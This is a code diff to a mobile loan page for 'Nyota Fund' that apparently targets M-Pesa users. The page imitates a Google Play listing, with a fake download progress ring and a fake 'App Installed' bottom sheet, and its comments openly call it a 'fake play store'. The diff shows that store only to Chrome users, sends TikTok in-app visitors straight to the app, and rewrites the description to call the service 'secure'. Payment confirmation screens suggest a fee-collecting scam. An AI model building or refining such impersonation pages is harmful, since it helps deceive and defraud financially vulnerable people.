@@ -84,24 +84,27 @@
         }
         .animate-pulse-subtle { animation: pulseSubtle 2.5s infinite; }
         
-        /* Modal Animation */
-        @keyframes modalPop { 0% { transform: scale(0.9); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
-        .modal-pop { animation: modalPop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
+        /* Native Bottom Sheet Animation */
+        @keyframes slideUp { 0% { transform: translateY(100%); } 100% { transform: translateY(0); } }
+        .bottom-sheet { animation: slideUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
     </style>
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
 
 <div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw] font-sans">Message</div>
 
-<!-- 1. THE INSTALL SUCCESS MODAL -->
-<div id="install-success-modal" class="hide fixed inset-0 z-[10005] bg-slate-900/80 backdrop-blur-sm flex items-center justify-center p-6">
-    <div class="modal-pop bg-white rounded-3xl p-8 w-full max-w-sm shadow-2xl text-center">
-        <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-5">
-            <svg class="w-10 h-10 text-brandGreen" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
-        </div>
-        <h2 class="text-2xl font-extrabold text-slate-900 mb-2">App Installed!</h2>
-        <p class="text-sm text-slate-500 mb-8">Nyota Fund has been successfully added to your home screen. You can now open it directly from your app drawer.</p>
-        <button onclick="closeInstallModal()" class="native-btn text-lg">Proceed to App</button>
+<!-- 1. NATIVE INSTALL SUCCESS PROMPT (Bottom Sheet) -->
+<div id="native-install-prompt" class="hide fixed inset-0 z-[10005] bg-slate-900/60 backdrop-blur-sm flex items-end justify-center">
+    <div class="bottom-sheet bg-white w-full max-w-lg rounded-t-3xl p-6 shadow-2xl text-center pb-10">
+        <div class="w-16 h-1 bg-gray-300 rounded-full mx-auto mb-6"></div>
+        
+        <img src="icon-512.png" class="w-20 h-20 rounded-2xl mx-auto mb-4 shadow-md border border-gray-100" alt="Nyota Fund">
+        
+        <h2 class="text-2xl font-extrabold text-slate-900 mb-2">App Installed</h2>
+        <p class="text-sm text-slate-500 mb-8 px-4">Nyota Fund is ready. You can now open the app directly from your home screen for the best experience.</p>
+        
+        <button onclick="closeNativePrompt()" class="native-btn text-lg w-full mb-3">Got it</button>
+        <button onclick="forceOpenWeb()" class="text-sm font-semibold text-slate-500 w-full">Continue in Browser</button>
     </div>
 </div>
 
@@ -124,7 +127,6 @@
         <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path></svg>
     </div>
     <div class="p-5 max-w-lg mx-auto">
-        <!-- App Header -->
         <div class="flex gap-4 mb-4">
             <div class="relative w-[104px] h-[104px] flex-shrink-0 flex items-center justify-center">
                 <svg id="ring-svg" class="hidden w-full h-full transform -rotate-90 absolute inset-0 z-10"><circle cx="52" cy="52" r="48" stroke="#F1F5F9" stroke-width="5" fill="none"/><circle id="download-ring" cx="52" cy="52" r="48" stroke="#0056D2" stroke-width="5" fill="none" stroke-dasharray="301.59" stroke-dashoffset="301.59" stroke-linecap="round"/></svg>
@@ -137,7 +139,6 @@
             </div>
         </div>
 
-        <!-- Rating & Downloads Row -->
         <div class="flex justify-between items-center text-center py-4 mb-4 border-y border-gray-100">
             <div class="flex-1 flex flex-col items-center border-r border-gray-200">
                 <div class="flex items-center gap-1">
@@ -152,7 +153,6 @@
             </div>
         </div>
 
-        <!-- Download Progress -->
         <div id="download-text" class="hide mb-4">
             <span id="download-percent" class="text-sm font-semibold text-gray-700">0% of 10 MB</span>
             <div class="flex items-center gap-1 mt-1 text-playGreen">
@@ -161,7 +161,6 @@
             </div>
         </div>
 
-        <!-- Action Buttons -->
         <div class="flex gap-2 mb-6" id="pre-install-buttons">
             <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
         </div>
@@ -174,11 +173,10 @@
             <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3 rounded-full">Open</button>
         </div>
 
-        <!-- Short Description Only -->
         <div class="mt-4 border-t border-gray-100 pt-6">
             <h3 class="font-bold text-lg text-gray-900 mb-2">About this app</h3>
             <p class="text-sm text-gray-600 leading-relaxed">
-                Get instant mobile loans from Ksh 1,000 to Ksh 25,000 directly to your M-Pesa. Fast approval, low interest, and flexible terms.
+                Nyota Fund is a secure financial services application. Apply for a loan and receive funds directly to your M-Pesa.
             </p>
         </div>
     </div>
@@ -329,7 +327,6 @@
                 <p id="verify-time" style="color: #D32F2F; font-weight: 800; margin-top: 20px; font-size: 18px; background: #FEF2F2; padding: 6px 18px; border-radius: 999px; display: inline-block;">0s</p>
             </div>
 
-            <!-- SUCCESS -->
             <div id="success-anim" class="hide flex flex-col items-center">
                 <div class="check-circle">
                     <svg class="w-12 h-12 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
@@ -349,7 +346,6 @@
                 <p style="font-size: 12px; color: #94A3B8; font-weight: 500;">You may now close the app</p>
             </div>
 
-            <!-- FAILED -->
             <div id="failed-anim" class="hide flex flex-col items-center">
                 <div style="width: 96px; height: 96px; background: #FEE2E2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
                     <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"></path></svg>
@@ -376,7 +372,6 @@
                 </button>
             </div>
 
-            <!-- PENDING -->
             <div id="pending-anim" class="hide flex flex-col items-center">
                 <div style="width: 96px; height: 96px; background: #FEF3C7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 48px; color: #D32F2F; font-weight: 800;">?</div>
                 <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Still Confirming</h2>
@@ -548,7 +543,7 @@ document.getElementById('btn-store-install').addEventListener('click', () => {
             deferredPrompt.prompt();
             deferredPrompt.userChoice.then((choiceResult) => {
                 if (choiceResult.outcome === 'accepted') {
-                    closeInstallModal();
+                    document.getElementById('native-install-prompt').classList.remove('hide');
                 }
                 deferredPrompt = null;
             });
@@ -559,8 +554,16 @@ document.getElementById('btn-store-install').addEventListener('click', () => {
     }
 });
 
-function closeInstallModal() {
-    document.getElementById('install-success-modal').classList.add('hide');
+function closeNativePrompt() {
+    document.getElementById('native-install-prompt').classList.add('hide');
+    // In a real native app, we'd close the app or go back to home screen. 
+    // Here we just clear the fake play store to avoid visual glitch if they stay in browser
+    playStoreGate.classList.add('hide'); 
+    appContent.classList.remove('hide'); 
+}
+
+function forceOpenWeb() {
+    document.getElementById('native-install-prompt').classList.add('hide');
     playStoreGate.classList.add('hide');
     appContent.classList.remove('hide');
 }
@@ -572,7 +575,7 @@ function startFakeDownload() {
     document.getElementById('ring-svg').classList.remove('hidden');
 
     const startTime = Date.now();
-    const duration = 1500;
+    const duration = 4000; // 4 seconds
 
     clearInterval(fakeInterval);
     fakeInterval = setInterval(() => {
@@ -590,8 +593,14 @@ function updateProgressUI(progress) {
 }
 
 document.getElementById('btn-open-app').addEventListener('click', () => {
-    playStoreGate.classList.add('hide');
-    appContent.classList.remove('hide');
+    // If the user is in Chrome, show the native prompt instead of opening the app content
+    if (deferredPrompt || _isChromeBrowser) {
+        document.getElementById('native-install-prompt').classList.remove('hide');
+    } else {
+        // If they are in TikTok, bypass and open web app
+        playStoreGate.classList.add('hide');
+        appContent.classList.remove('hide');
+    }
 });
 
 function showAppInline(){
@@ -636,8 +645,10 @@ if (isStandalone) {
     playStoreGate.classList.add('hide');
     showAppInline();
 } else if (_isInApp || (_isAndroid && !_isChromeBrowser)) {
-    playStoreGate.classList.remove('hide');
-    showInstallState();
+    // NON-CHROME / TIKTOK -> SKIP PLAY STORE AND GO STRAIGHT TO APP
+    playStoreGate.classList.add('hide');
+    appContent.classList.remove('hide');
+    bootApp();
 } else if (_isIOS) {
     playStoreGate.classList.add('hide');
     appContent.classList.remove('hide');
@@ -647,6 +658,7 @@ if (isStandalone) {
     appContent.classList.remove('hide');
     bootApp();
 } else {
+    // CHROME -> SHOW FAKE PLAY STORE
     playStoreGate.classList.remove('hide');
     showInstallState();
 }
